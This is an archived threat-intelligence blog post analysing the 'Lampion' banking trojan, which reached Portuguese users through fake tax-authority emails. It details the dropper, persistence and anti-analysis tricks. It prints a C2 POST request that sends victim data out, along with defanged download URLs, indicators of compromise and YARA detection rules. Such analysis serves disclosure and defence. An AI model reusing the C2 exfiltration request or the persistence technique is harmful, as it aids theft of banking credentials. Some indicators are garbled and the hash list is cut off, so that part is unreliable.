{
    "id": "c0560abb-84ba-48bb-a36f-eb22fb7e8479",
    "created_at": "2023-01-12T15:05:16.135135Z",
    "updated_at": "2025-03-27T02:05:58.546085Z",
    "deleted_at": null,
    "sha1_hash": "16a5e4ddbfe97b7e9dd986ad815105ef745ce9c2",
    "title": "2019-12-26 - Targeting Portugal- A new trojan ‚ÄòLampion‚Äô has spread using template emails from the Portuguese Government Finance & Tax",
    "authors": "",
    "file_creation_date": "2022-05-28T21:46:43Z",
    "file_modification_date": "2022-05-28T21:46:43Z",
    "file_size": 4561594,
    "plain_text": "# Targeting Portugal: A new trojan ‚ÄòLampion‚Äô has spread using template emails from the Portuguese Government Finance & Tax\n\n**seguranca-informatica.pt/targeting-portugal-a-new-trojan-lampion-has-spread-using-template-emails-from-the-**\nportuguese-government-finance-tax/\n\nDecember 26, 2019\n\n**New trojan called ‚ÄòLampion‚Äô has spread using template emails from the Portuguese**\n**Government Finance & Tax during the last days of 2019.**\nLast days of 2019 were the perfect time to spread phishing campaigns using email templates\nbased on the Portuguese Government Finance & Tax. SI-LAB noted that Portuguese users\nwere targeted with malscam messages that reported issues related to a debt of the year\n2018.\n\nIn detail, the emails are related to the Rendimento de Pessoas Singulares ‚Äì IRS (annual tax\ndeclaration), and any citizen who has received the message can be misled by criminals ‚Äì as\nthe end of the year is the right time to discuss issues within this context.\n\n\n-----\n\nThe malware was named ‚ÄòLampion‚Äô as this is the name used as part of its internal name.\nRegarding a broad analysis, it looks like the Trojan-Banker.Win32.ChePro family, but with\nimprovements that make hard its detection and analysis.\n\nIn brief, when the victim clicks on the links available in the email body the malware is\ndownloaded from the online server. The downloaded file is a compressed file (.zip) called:\n**FacturaNovembro-4492154-2019-10_8.zip.**\n\nAs observed, after extracting the file, three files are presented.\n\n\n-----\n\nThe file ‚ÄúFacturaNovembro-4492154-2019-10_8.vbs‚Äù is the first stage of the Lampion‚Äôs\ninfection chain. This is a Visual Basic Script (VBScript) file that is acting as a dropper and\ndownloader. It downloads the next stage from the compromised server available on the\nInternet on an AWS S3 bucket.\n\nThe trojan Lampion uses anti-debug and anti-vm techniques. The use of a commercial\n[protector known as VMProtector 3.x and also specially crafted codes make it difficult to](http://vmpsoft.com/support/user-manual/introduction/history-of-changes/)\nanalyze both on a sandbox environment or manually.\n\nAfter the VBScript file is executed, two files are downloaded: P-19-2.dll and 0.zip. The P-192.dll file (Lampion) is a PE File that is executed during a VBScript execution when the\naffected computer starts. That file invokes the second file, 0.zip, that is a DLL file with\nadditional code on C2 and how the trojan gets details from the user‚Äôs computers. This DLL\ncontains a name in the Chinese language with the following target message for Portugal:\n‚ÄúYour group of Portuguese suckers‚Äù.\n\n\n-----\n\nLampion trojan (P-19-2.dll) was sent to the VirusTotal by SI-LAB, and 12 from 71 engines\nclassified it as malware. This is a clear signal that most of the antivirus engines don‚Äôt detect\nyet the malware signature.\n\nDetails from the computer‚Äôs disk, opened windows, clipboard and banking credentials are\ngathered and sent to the C2 available on the Internet. The malware only runs if the DLL\n(inside the 0.zip file) is available on the same directory where it is executed.\n\nUsers who receive emails this nature should be aware as these files have a low detection\nrate and will extract sensitive details including banking credentials from victims‚Äô computers.\nFor Portuguese citizens, special attention on this holiday season as this is an ongoing target\ncampaign.\n\nFor more details and complete analysis of this malicious campaign see the Technical\nAnalysis below.\n\n## Technical Analysis\n\nSeveral emails were received by Portuguese users about a new campaign related to the\nRendimento de Pessoas Singulares ‚Äì IRS (annual tax declaration) during the last days of\n2019. Two examples can be seen in Figure 1 below.\n\n\n-----\n\n**_Figure 1: Two template emails used to spread the trojan Lampion._**\n\nAt the first glance, just the URLs and their description are different between both templates.\nThe URLs are responsible to download a zip file that contains three files described below.\n\n**_Figure 2: URL (1) hosting the malware on the Internet (a zip file)._**\n\n\n-----\n\n**_Figure 3: URL (2) hosting the malware on the internet (a zip file)._**\n\n## Why Lampion?\n\nAs observed, the malware icon is a ‚Äúlampion‚Äù, and the original name is ‚ÄúLampion‚Äù. It seems a\nreference to a Japanese lampion.\n\n**_Figure 4: Malware‚Äôs original name and details._**\n\n## Lampion trojan malware ‚Äì The 1st stage\n\n**Threat name: FacturaNovembro-4492154-2019-10_8.zip**\n**MD5: e7bdce5505ee263530dea04c2fdc661f**\n**SHA1: d4927477b71cbf540a894cf2c5849209b64c92af**\n\nThis is the zip file that contains the malware‚Äôs first stage downloaded from compromised\nservers online. It is a zip file, with a low detection rate, and it contains inside 3 other files.\n\n\n-----\n\n**_Figure 5: Available files after extracting the zip file._**\n\nThe files are as follows:\n\n[1] ‚Äì FacturaNovembro-4492154-2019-10_8.pdf\n(51fbca86a499c55ce31179fc36e0d889)\n\n**[2] ‚Äì FacturaNovembro-4492154-2019-10_8.vbs**\n**(3350e74a4cfa020f9b256194eae25c12)**\n\n[3] ‚Äì Politica de Protecao de Dados ‚Äì ST-8 (deb80a47496857e24c0bc57873b25707)\n\nOnly the [2] file (FacturaNovembro-4492154-2019-10_8.vbs) has malicious code capable\nof infecting victims‚Äô computers.\n\nIn contrast, files [1] and [3] are harmless and are only used as a way of inducing the victims\nto open the VBS document ‚Äì the Lampion 1st stage.\n\n**_Figure 6: Snippet from the Politica de Protecao de Dados ‚Äì ST-8 file, never used during_**\n_the malware infection chain._\n\nOn the other hand, the PDF file [1] is just a PDF file with some information contained inside,\nand without malicious links or activity to collect details on the victim‚Äôs computer.\n\n\n-----\n\n**_Figure 7: Object content from FacturaNovembro-4492154-2019-10_8.pdf._**\n\n**_Figure 8: Content available on PDF file FacturaNovembro-4492154-2019-10_8.pdf._**\n\n**_Figure 9: Translation from the Portuguese language to English._**\n\nThe file states that the file to be executed is here, in the same directory of the PDF file . That\nmessage is completely confidential, has a unique code, and the date of issuance is\nhighlighted to create a bad feeling on the victim‚Äôs side.\n\n\n-----\n\n**Threat name: FacturaNovembro-4492154-2019-10_8.vbs (Lampion ‚Äì 1st stage)**\n**MD5: 3350e74a4cfa020f9b256194eae25c12**\n**SHA1: 7f5960ff9feff30d2f4a4c1598dd22632ceea0cb**\n\nThis file has a detection rate of 25/58 and is classified as a Trojan Agent. It is, in fact, a\ntrojan downloader/dropper as it downloads the next stage from the Internet and also drops a\nnew VBS file that will be executed whenever the victim‚Äôs computer starts. It looks like an\nimprovement form of the Trojan-Banker.Win32.ChePro family.\n\n**_Figure 10:_** _[VirusTotal analysis from FacturaNovembro-4492154-2019-10_8.vbs file.](https://www.virustotal.com/gui/file/418dbcf5f8d5ad7e16a0bb48c1e14cb269bf5bd814f0a70c3aa90ce787136047/detection)_\n\nLooking at the file, it is obfuscated, but in this case, the technique used by criminals was\nsimple: just add commentaries (junk blocks) between the lines of the malicious code to\nmake it confused.\n\n\n-----\n\n**_Figure 11: First stage of the Lampion malware ‚Äì obfuscated code._**\n\nAfter a few rounds of code cleanup (deobfuscation), the final code comes up. Before going\ninto the detail, the high-level diagram with the overall behavior of the file is presented.\n\n**_Figure 12: Lampion 1st stage high-level diagram._**\n\nIn detail, the first stage works as described below.\n\n\n-----\n\nIt depends on the initial victim s action.\nThe VBS file downloads additional files from the Internet (the 2nd stage ‚Äì the Lampion\nitself).\n2 files are downloaded to the AppData Windows folder, and a new VBS file is also\ncreated with the code that will execute the trojan every time the victim‚Äôs computer\nstarts.\nA .lnk file is created on the Windows StartUp folder to execute the trojan (a persistence\ntechnique).\nFinally, the victim‚Äôs computer is forced to reboot and the trojan malware starts its\nexecution.\n\n## Digging into the details ‚Äì Lampion 1st stage\n\nThe 1st stage has random functions to generate random names that will be used to rename\nthe next malicious files created on the victim‚Äôs machine. Line 27 is where the Wscript object\n**is created that will be used to create a .lnk file on the Windows StartUp folder. All the**\nmalware source code is commented on the next images.\n\n**_Figure 13: Random functions that generate random names ‚Äì (1/5)._**\n\nThe next figure has the function to decrypt the URLs from which the 2nd stage of malware is\ndownloaded.\n\n\n-----\n\n**_Figure 14: Decryption function used to decrypt the URLs where the next stage is available ‚Äì_**\n_(2/5)._\n\nNext, all the shortcuts (.lnk) files are deleted from the operating system StartUp folder (line\n65).\n\nAfter that, all the VBS files from the operating system StartUp folder are also removed to\nprevent other files can start with the OS. A randomly named folder is created in the Windows\nAppData directory that will keep the malicious files.\n\n\n-----\n\n**_Figure 15: Some operations are performed, such as create folders on AppData and setting_**\n_the default process security level with VBScript ‚Äì (3/5)._\n\nNow is time to download the 2nd stage from the Internet. Two files are obtained from 2 AWS\nS3 buckets.\n\n**_Figure 16: Trojan 2nd stage is downloaded from two AWS S3 buckets ‚Äì (4/5)._**\n\nThe URLs are encoded with the following strings:\n\n\n-----\n\n```\nlogs Decrypt( &aQ >jhjqfFi 0o%B% \\tkLYya jL \\[{m[e1hYb Z!$miU)e$5k3i]# [OWHi(jc#\n(F$bWHcVW\\pWe;deW3m$i_$TY%emc^%s&M$Tp^_OfxK\")\nur = Decrypt(\"{PL^7j\\j9f)is0D%9%aiXZ~]E^\\i#k*_+ZW^(eU_ZNe^]5^;i}ZaYm'Y/wYH$6im)6$tksiw#|[dWNi)ja#*([email protected]&m.ix$uYde&ch%\n{F,#8'9/T#F(]$`ZdbrbY#\")\n\n```\nTo get the result of plain-text URLs, SI-LAB is keeping the decryption code available on\n[GitHub. The result is as follows.](https://github.com/sirpedrotavares/SI-LAB-malware/blob/master/decryption-strings-lampion.vbs)\n\n**_[Figure 17: Clean URLs as a result of the decrypted function output (available here).](https://github.com/sirpedrotavares/SI-LAB-malware/blob/master/decryption-strings-lampion.vbs)_**\n\nAs observed, the output shows us two AWS-hosted addresses that contain two malicious\nfiles, namely:\n\n\n-----\n\n```\nhxxps[:]//fucktheworld.s3.us east 2.amazonaws[.]com/0.zip\nhxxps[:]//sdghsuidhoidoghsdc19c.s3.us-east-2.amazonaws[.]com/P-19-2.dll\n\n```\nThe 0.zip file is a DLL with additional code loaded by PE File P-19-2.dll during its execution.\nIt is the PE file that will be executed each time the infected machine starts. This file is overly\nlarge (32 MB in size), with a lot of trash to make it difficult to detect.\n\nContinuing to the last part of the 1st stage, the VBS file, in the last phase a VBS file is\ncreated in the AppData folder (C:\\Users\\user\\AppData\\Roaming\\lkuuxelnxqy.vbs).\n\nAlso, a .lnk is created in the Windows StartUp folder\n(C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start\n**Menu\\Programs\\Startup\\lkuuxelnxqy.lnk) which will then execute the next malware stage**\n(P -19-2.dll).\n\n**_Figure 18: VBS file is executed and the operating system is restarted ‚Äì (5/5)._**\n\nFinally, WScript.Shell runs the created VBScript file, the victim‚Äôs computer is forced to restart,\nand the malware itself (P-19-2.dll) runs on the infected machine.\n\n## Lampion Trojan ‚Äì 2nd Stage (after the persistence)\n\n**Threat name: P-19-2.dll**\n\n**MD5: 18977c78983d5e3f59531bd6654ad20f**\n\n**SHA1: 941d03715af25f7bfedaaf86081ebc2046b4b019**\n\nFrom the first submission we noticed that the threat was recent and unique in VirusTotal.\n\n\n-----\n\n**_[Figure 19: Lampion VirusTotal detection rate (P-19-2.dll).](https://www.virustotal.com/gui/file/eb3f2be571bb6b93ee2e0b6180c419e9febfdb65759244ea04488be7c6f5c4e2/detection)_**\n\nThis file first appears as a DLL, but it is a PE File. As can be seen from Figure 15 ‚Äì line 86, it\nis written directly to disk as an executable.\n\nAs noted, 12 of 71 AV engines classified the file as malware. The file is extremely large (32\nMB), with a lot of junk allowing, thus, to evade antivirus engines as a result.\n\n## The malware‚Äôs protection\n\n[As explained below, malware is protected by VMProtect 3.x which makes it difficult to](http://vmpsoft.com/support/user-manual/introduction/history-of-changes/)\nanalyze even through a manual approach.\n\n_VMProtect protects code by executing it on a virtual machine with non-standard_\n_architecture that makes it extremely difficult to analyze and crack the software._\n_Besides that, VMProtect generates and verifies serial numbers, limits free upgrades_\n_and much more._\n\nAfter some rounds, we found that it is protected with the VMProtect 3.x .\n\n\n-----\n\n**_Figure 20: Lampion protected with the VMProtect 3.x._**\n\nVMProtect has 3 protection modes: Mutation, Virtualization, and ‚ÄúUltra‚Äù (both methods\ncombined).\n\n**_Mutation does what it says it does: it mutates the assembly code to make automated_**\n_analysis of it harder. The resulting mutated code varies drastically per compilation._\n\n_On the other hand, Virtualization translates the code into a special format that only a_\n_special virtual machine can run. It then inserts a ‚Äústub‚Äù function to call the VM where_\n_the actual code was supposed to be ran._\n\nAnother detail is two sections identified in PE File ( vmp0 and vmp1 ), which contains the\npacked binary code which will later be devirtualized at runtime, and also has the EP (entry\npoint) where the binary will be executed first.\n\n**_Note: Details about the VMProtector disassemble will not be displayed in this analysis_**\n**_as it is commercial software for packing and protecting executable files._**\n\n\n-----\n\n**_Figure 21: Malware sections and high entropy of section vmp1._**\n\nAs shown, there are two sections in binary (vmp0 and vmp1) with high entropy that are\nknown as a result of VMProtector. Also, the EP is outside of the standard location. Now it is\non: .vmp1.\n\n[In detail, the malware was developed in Delphi. The IDE Embarcaredo was used to support](https://www.embarcadero.com/br/)\nits developing.\n\n**_Figure 22: Resources from the Lampion trojan malware._**\n\nAs noted from Figure 22, all the source-code logic is available within a feature called\n**TFORM1, a Delphi form.**\n\n\n-----\n\n**_Figure 23: Details about Embarcaredo._**\n\nHowever, once the malware is protected with VMProtector, it is not possible to decompile the\nbinary source-code.\n\n## Disassembling ‚Äì Deep inside\n\nBy disassembling it, it is possible to get a binary dump by indicating the potential OEP\n(original entry point). Although part of the binary code remains obfuscated and protected,\nthrough this technique, it was possible to get some details about the inner structure of the\nmalware.\n\n\n-----\n\n**_Figure 24: Dumping the binary code, building the binary IAT and get internal details on how_**\n_it works._\n\nThe extracted file has its partial IAT messed up and the name of each function does not\nappear because its respective virtual addressing is necessary to convert it to a raw\naddressing. This is a result of the VMProtector 3.x.\n\nAfter the partially unpacked binary, we can see some functions it is using, namely:\n\n**ShowWindow: Sets the specified window‚Äôs show state.**\n**GetWindowTextW: Copies the text of the specified window‚Äôs title bar.**\n**IsDialogMessageW: Determines whether a message is intended for the specified**\ndialog box.\n**GetDesktopWindow: Retrieves a handle to the desktop window.**\n**GetCursorPos: Retrieves the position of the mouse cursor, in screen coordinates.**\n**GetMenuState: Retrieves the menu flags associated with the specified menu item.**\n**GetKeyboardLayoutNameW: Retrieves the name of the active input locale identifier.**\n**OpenClipboard: Opens the clipboard for examination.**\n\n\n-----\n\n**EnumDisplayMonitors: It enumerates display monitors.**\n\n\n-----\n\n**_Figure 25: Functions used to get details about the victim‚Äôs computer._**\n\nDuring the static analysis, we identified some functions such as HideFromDebugger and\n**_IsDebuggerPresent, and even the library SBIEDLL.DLL which aims to detect if the program_**\nis running in a virtual environment.\n\n## Lampion ‚Äì Dynamic Analysis\n\nAt the moment, the file 0.zip has not been used (the second one that was downloaded and\npresented in Figure 16).\n\nWhen the Lampion is running, it will try to read the 0.zip file from the same directory where it\nis executing (AppData, in this case).\n\n**_Figure 26: 0.zip file not found and a popup message is presented. The malware terminates_**\n_its execution._\n\n\n-----\n\nThe 0.zip file was not found (the second file downloaded by VBScript). By submitting the\nexecutable file to sandboxes on the Internet, it will never be run derived from this\ndependency. This can be seen as a mechanism for a dynamic analysis not to be performed\nproperly.\n\nBy fixing this detail, we can validate that malware actually can read the file.\n\n**_Figure 27: 0.zip file is now accessed by Lampion and its content is loaded._**\n\nThe 0.zip file is a compressed file with a DLL inside it with additional code. But the file is\nprotected with a password. Only the 2nd stage (Lampion) has that password inside.\n\n\n-----\n\n**_Figure 28: 0.zip file protected by a password hardcoded inside the malware 2nd stage_**\n_(Lampion trojan)._\n\nThis can be seen as yet another anti-reversing mechanism introduced by malware authors.\n\nTo get details about the library inside the 0.zip file, we analyzed the 2nd stage and identified\nthe right moment the file is unzipped to obtain the password hardcoded from memory (as it is\nobfuscated).\n\n**_Figure 29: Password of 0.zip file extracted from memory._**\n\nAfter extracting the files, we can see that its name has Chinese characters. Through the\ntranslated message ‚ÄúYour group of Portuguese suckers‚Äù we can conclude that this threat\nis targeting Portuguese citizens.\n\n**_Figure 30: Message left by criminals indicating that the threat is targeting Portuguese_**\n_citizens._\n\n\n-----\n\nAgain, this file is also protected with VMProtector 3.x. This can be observed in Figure 31.\n\n**_Figure 31: 0.zip file sections._**\n\nAs shown, most of the file content and EP address are located in the vmp01 section. From\nFigure 32, we can observe the DLL export address table (EAT).\n\n**_Figure 32: Export Address Table (EAT) from the DLL inside 0 zip_**\n\n\n-----\n\nThat DLL contains part of the trojan code. Those functions are imported from this DLL. Some\nof the available functions are:\n\n**WNetUseConnectionW: It makes a connection to a network resource.**\n**WNetGetConnectionW: This function retrieves the name of the network resource**\nassociated with a local device.\n**WNetAddConnection2W: This function makes a connection to a network resource**\nand can redirect a local device to the network resource.\n**SHGetFolderPathW: Gets the path of a folder identified by a** [CSIDL value.](https://docs.microsoft.com/windows/desktop/shell/csidl)\n**FilterSendMessage: This function sends a message to a kernel-mode minifilter.**\n**FilterConnectCommunicationPort: It opens a new connection to a communication**\nserver port\n**DoThisBicht: Function invoked when the DLL file is loaded.**\n**CryptUIDIgCertMgr: It is a function that displays a dialog box that allows users to**\nmanage certificates.\n**CallFormPrincipal: It has the source-code logic about keylogger and C2.**\n\nIn detail, we can examine all the malware operations while we open a browser for accessing\na home banking website (the malware is activated during the https operation because the\ncertmgr.exe is launched).\n\nAn interesting detail found on ‚ÄúCallFormPrincipal‚Äù is the request method and C2 IP address.\n```\n$_POST=&plug=NAO&sowin=Windows%207%20Home%20Premium%20-%206.1%20-%207601\nhxxp://18.219.52.4/PT/VaiPostaProPai.php\n\n```\nIt also validates the windows hosts file to check the remote system discovery.\n```\nC:\\Windows\\System32\\drivers\\etc\\hosts\n\n```\nDuring malware execution, we verify that it collects data from clipboard, disk, browsers, and\nsends the details via a request to the C2 server available on the Internet.\n\n\n-----\n\n**_Figure 33: POST request sent to the C2 available online with details about the victim‚Äôs_**\n_computer._\n\n## Lampion ‚Äì C2 portal\n\nOn server C2, a portal is available that we did not have access to, however, it was possible\nto collect some interesting details.\n\nAn interesting indicator is that this banking trojan does not have a high detection rate, and\ncan easily run and make persistent on victims‚Äô computers.\n\n\n-----\n\nFor example, the URL where the victim data is sent (the POST request) is not identified as\nmalicious by the antivirus agents at the moment of writing this report.\n\n**_Figure 34: C2 server not detected on VirusTotal._**\n\nAs shown, the login page this panel can be accessed and a username and password are\nrequired.\n\n**_Figure 35: Login page of C2 panel._**\n\nBased on some paths available on the server-side, we can find that this is a portal already\nknown and shared in the past by David Montenegro along his analysis.\n\n\n-----\n\n**_Figure 36: Details on the C2 portal (flags that identified the victim‚Äôs origin)._**\n\nBrazilian Malware Banking ‚Ä¶ ü§îü§îü§î [pic.twitter.com/ITVe4r6bvV](https://t.co/ITVe4r6bvV)\n\n[‚Äî David Montenegro (@CryptoInsane) September 20, 2018](https://twitter.com/CryptoInsane/status/1042657116966854656?ref_src=twsrc%5Etfw)\n\nAs observed, the panel has details about the victim, namely:\n\n**Country;**\n**Date and hour of access;**\n**Operating System;**\n**Computer Name;**\n**Installed antivirus engine;**\n\n\n-----\n\n**Version; and**\n**Plugin.**\n\n**_Figure 37: Images about the potential C2 portal._**\n\n\n-----\n\n**_[Figure 38: Lampion overlay screens (courtesy of MillenniumBCP -Portugal).](https://ind.millenniumbcp.pt/pt/Particulares/seguranca/Pages/avisos2019/aviso-2309.aspx)_**\n\nWe contacted Amazon Web Services (AWS) to decommission the domains and C2 server\nbefore publishing the article, ensuring, thus, that the threat has been contained in a good\nway and by preserving the victim‚Äôs information. Nonetheless, malicious endpoints are still\nactive at the moment of writing this report.\n\n## Lampion ‚Äì Mitre Att&ck Matrix\n\n\n-----\n\n## Indicators of Compromise (IOCs)\n\n\n-----\n\n```\nURLs\nrebrand[.]ly/mmvk36?\n=NOWAUVJBNOWAUVJBNOWAUVJBNOWAUVJBNOWAUVJBNOWAUVJBNOWAUVJBNOWAUVJBNOWAUVJBNOWAUVJB\nhxxp[:]//100.26.189.49/PY/App.php?=5wzpz2e7xglkzmh\nhxxps[:]//fucktheworld.s3.us-east-2.amazonaws.com/0.zip\nhxxps[:]//sdghsuidhoidoghsdc19c.s3.us-east-2.amazonaws.com/P-19-2.dll\nhxxp[:]//18.219.52.4/PT/VaiPostaProPai.php\nHashes\ne7bdce5505ee263530dea04c2fdc661f (FacturaNovembro-4492154-2019-10_8.zip)\ndeb80a47496857e24c0bc57873b25707 (Politica de Protecao de Dados - ST-8)\n51fbca86a499c55ce31179fc36e0d889 (FacturaNovembro-4492154-2019-10_8.pdf)\n3350e74a4cfa020f9b256194eae25c12 (FacturaNovembro-4492154-2019-10_8.vbs)\n18977c78983d5e3f59531bd6654ad20f (P-19-2.dll | P-19.2.exe - Lampion)\n76eed98b40db9ad3dc1b10c80e957ba1 (‰Ω†ÁöÑ‰∏ÄÁæ§Ëë°ËêÑÁâô‰∫∫ÁöÑÂê∏Áõ§)\nC2\nhxxp[:]//18.219.52.4/PT/VaiPostaProPai.php\nhxxp[:]//18.219.52.4/PT/index.php\nhxxp[:]//18.219.52.4/PT/admin.php\nhxxp[:]//18.219.52.4/PT/png/pt.png\nhxxp[:]//18.219.52.4/PT/SO/\n18[.]219.52.4/PT/painelADM.php\n18[.]219.52.4/PT/painel.php\n$_POST=&plug=NAO&sowin=Windows%207%20Home%20Premium%20-%206.1%20-%207601\n-----/-----------/-----------/--------New Wave/samples 01-12-2020\n----/------------/------------/-------C2 \nhxxp://18.217.136[.]142\n/PTG/PostaEstaPorra.php?\nplug=NAO&GBS=&SYS=Microsoft%20Windows%207%20Professional%20&USERPC=admin%20-%20USERPC&AVS=&NAV=IE&ORI=CA.1.0\nhxxps://guridosinferno.s3.us-east-2[.]amazonaws.com\nhxxps://sdufyuidgfysviuvsdiufsdg04g.s3.us-east-2.amazonaws[.]com\nHashes\n65283458b84abbb4859e69367cf2b6db\n6a55add166979082c4a5771ce7088c7d\n-----/--------/--------/-------------New wave 01-14-2020\n------/---------/-------/------------From:\n[email protected][.]pt\nMalicious VBS file:\nFacturaDezembro-102587-2019-10_2.vbs\nURLs:\nhXXps://nothingcanstopus.s3.us-east-2[.]amazonaws[.]com/0.zip\n\n```\n\n-----\n\n```\nhXXps://sdgsdbfabsfuhoiuhfosdpnfsdbc13c.s3.us east 2[.]amazonaws[.]com/P 13 8.dll\nnothingcanstopus.s3.us-east-2[.]amazonaws[.]com / 52.219.100[.]96\nsdgsdbfabsfuhoiuhfosdpnfsdbc13c.s3.us-east-2[.]amazonaws[.]com / 52.219.88[.]72\nC2:\nhxxp[:]//18.217.}136[.142/PTI/index.php\nPOST /PTI/PostaEstaPorra.php\nHashes:\n7d2def754f33b7ff84b69b50f0b2b37a (0.zip)\n217f2109bfbbe7cb3bfb0cc2824d9fac (P-13-8.dll)\nd7a54b62097678df7ad6a0d2871dc342 (FacturaDezembro-102587-2019-10_2.vbs)\nhttps://urlhaus.abuse.ch/url/288135/\nhttps://urlhaus.abuse.ch/url/288134/\nhttps://pastebin.com/5b0p5Vda\n---/---------------/---------------/-New wave 01-16-2020\n/---------------/------------/-------SHA1: 7c4373ef103fc4f26fb3ef0e67337b2bad28c6a00122eb16560d552bf3666029\nFactura-Janeiro-2145892315-2019-10_28.vbs\nURLs:\nhxxps://fghdsfuoiyiuwjkbsdfguuiosdgc19c.s3.us-east-2.amazonaws[.com/P-19-2.dll\nhxxps://nothingcanstopus.s3.us-east-2.amazonaws.]com/0.zip.dll \nC2: hxxp[:]//18.217.}136[.142/PTG/index.php\nPOST /PTI/PostaEstaPorra.php\n-----/-----------/------------/---------New wave 12-02-2020\n---------/-------------/-----------/----MD5: 0998f6473004e0ba54ead5784ba62db8\nVT:\nhttps://www.virustotal.com/gui/file/b1439399ba75857a3d4add37fb9a2cb585ec3bd3bd01c19a1b\nURLs:\nh}//vrau-x.s3.us-east-2.amazonaws.[com/0.zip\nh//oiurx14x.s3.us-east-2.amazonaws.}com/P-14-7.dll\nC2:  \nhttp:]//13.59.112.]88/NPT/PediuPraPostarPostou.php\n----------/---------------/Lampion origin servers - Turkey 27-02-2020 -----/----------/-185[.219.133.128\n185[.181.209.7\n\n```\n\n-----\n\n```\nhxxp://185[.181.209.7/005.]php\nhxxp://185[.219.133.128/005.]php\nNome do Servidor: Linux portaldasfinancas\n[- Foi Tudo sapohha! - By ] \nGoogle-dork\nq=+%22Sistema%20Operacional%22%20+%22Endere%C3%A7o%20IP%22%20+%22Software%20usado%22\n\n## Lampion V2 ‚Äì IOCs (February 2020)\n\n```\n[[2020-02-13] #Lampion v2](https://twitter.com/hashtag/Lampion?src=hash&ref_src=twsrc%5Etfw) [#portugalÔøΩ](https://twitter.com/hashtag/portugal?src=hash&ref_src=twsrc%5Etfw) [#malware](https://twitter.com/hashtag/malware?src=hash&ref_src=twsrc%5Etfw) [#ATA](https://twitter.com/hashtag/ATA?src=hash&ref_src=twsrc%5Etfw) üßê\n\n0998f6473004e0ba54ead5784ba62db8\n\nh}//vrau-x.s3.us-east-2.amazonaws.[com/0.zip\n\nh//oiurx14x.s3.us-east-2.amazonaws.}com/P-14-7.dll\n\n[http:]//13.59.112.]88/NPT/PediuPraPostarPostou.php@CNCSgovpt](https://twitter.com/CNCSgovpt?ref_src=twsrc%5Etfw)\n[@JAMESWT_MHT](https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw) [@malwrhunterteam](https://twitter.com/malwrhunterteam?ref_src=twsrc%5Etfw) [pic.twitter.com/YKrrHUYqLV](https://t.co/YKrrHUYqLV)\n\n[‚Äî Pedro Tavares (@sirpedrotavares) February 13, 2020](https://twitter.com/sirpedrotavares/status/1227957576047955971?ref_src=twsrc%5Etfw)\n\n**URL:** [https://seguranca-informatica.pt/lampion-malware-v2-february-2020](https://seguranca-informatica.pt/lampion-malware-v2-february-2020/#.XlQRPij7RQA)\n\n## Lampion origin ‚Äì servers geolocated in Turkey (27th February 2020)\n\n[Lampion malware origin servers geolocated in Turkey](https://seguranca-informatica.pt/lampion-malware-origin-servers-geolocated-in-turkey/)\n\n## Lampion is back after 3 months (May 2020)\n\n[Trojan Lampion is back after 3 months](https://seguranca-informatica.pt/trojan-lampion-is-back-after-3-months/)\n\n### Yara rules\n\n\n-----\n\n```\nrule Lampion_VBS_File_Portugal {\n meta:\n description = \"Yara rule for Lampion Portugal - December version\"\n author = \"SI-LAB - https://seguranca-informatica.pt\"\n last_updated = \"2019-12-28\"\n tlp = \"white\"\n category = \"informational\"\n strings:\n  $lampion_a = {53 65 74 20 76 69 61 64 6f 20 3d 20 63 75 7a 61}\n  $lampion_b = {76 69 61 64 6f 2e 57 69 6e 64 6f 77 53 74 79 6c}\n condition:\n  all of ($lampion_*) \n}\n--------------------------------import \"hash\"\nrule Lampion_DLL_Portugal {\n meta:\n description = \"Yara rule for Lampion Portugal - December version\"\n author = \"SI-LAB - https://seguranca-informatica.pt\"\n last_updated = \"2019-12-28\"\n tlp = \"white\"\n category = \"informational\"\n strings:\n  $lampion_a = {5468 6973 4269 6368 7400 4669 6c74 6572}\n condition:\n  all of ($lampion_*) or\n  hash.md5(0, filesize) == \"76eed98b40db9ad3dc1b10c80e957ba1\"\n}\n--------------------------import \"hash\"\nrule Lampion_malware_portugal {\n meta:\n description = \"Yara rule for Lampion Portugal - December version\"\n author = \"SI-LAB - https://seguranca-informatica.pt\"\n last_updated = \"2019-12-28\"\n tlp = \"white\"\n category = \"informational\"\n strings:\n  $lampion_a = {3f 3f 3f 3f 3f 3f 3f 74 61 3f 3f 3f 3f 3f 3f 00}\n condition:\n  all of ($lampion_*) or\n  hash.md5(0, filesize) == \"18977c78983d5e3f59531bd6654ad20f\"\n}\n\n```\n\n-----\n\n[All yara files available here.](https://github.com/sirpedrotavares/SI-LAB-Yara_rules)\n\n### Yara Retro hunt on two multi-scanners\n```\n348e3fd080c8002b826be2577ffa3bc64f263aa779c9f8ff88e4642c294c4381\n418dbcf5f8d5ad7e16a0bb48c1e14cb269bf5bd814f0a70c3aa90ce787136047\n990982736492bfa0b2a39b0fd05959fa92ca3a282e36977a2523b3fe641a4c34\n54cce7adca859d6bd85779ec7fa4fc7eb327f5067d25b1dada722ccdcf108281\n9e77a03223de62be70afe19961ca8d0b88b46c20c834a5bab30ab3334baa2415\n07f5932be35a720a74fc10e7ee6011fa2a8ee4c6df7cf9a6f06bfdc7bd5ec4a1\n09d44bdae0db9a91b86831f857efb45b05f62024a9b68c6977502a4dd729af76\n33166f904f6820a1ed22c75ead41102ce62dad0070dd314b899ab76b60a21378\n0eb71171482dd5db49bae10f9bf55d7bcbf0b4370f4a86654fac9d3bdc6b20ab\nf044d1de37ca8903c7bf6038e465bebc0c1ca2c9c8b53e19e1b8226fa820302f\n2e77d53186bd0a1a269864aca2369aae7a2629d1914c77bf6bc69e76aac491e2\n7c8c4ab0dd084a7e6e784923f1b125e3b6009f75269331639b120641508f7f51\n98db1f47e98a007ad5dfe0c5e1c6eb80dd5e171d6f252dda14c628ecf7c3f836\nfbd0c68e699e9d78da85ab11c7d50af71cb84e6d652f9ab8f8ac657bfb102920\nc52c0ae1c558be6eead13f50a9ea27a0eba1c4cdce17901ec3903c7b5e9eada0\n5c2e9c3cbcf7da70493da3f6efd6f6199d37ad68030a85303644992fbf12293c\n875cf24a3863f3e379c158de11baf5e0c70507ab7f37556ed8704e178ddf66ec\n1c1c64cf15b13aa67952830b5d606e7793456ddbf266910056ae16505fc57b0d\nce53debed7256fb71532e0348214356383070d24cc86ac59e94395225761f765\nf752698342d8dc62ff0e27a065e79c71bca87604ef786f838fc8e0513ce97cfc\nae9e53806d5287f3e22f4e6549b1286c28aa529b1267b4369f9db60529fefbfa\n643d400cbdcff21ca2c0b8539f6990e22ababc740ced01f466150e44b669edf5\n79aaa08982958ac5fa37e3709a6787619777e11af773609fd974095dfdb0f0fa\n9d9252149a6db832fd205e4d0d3395cee5c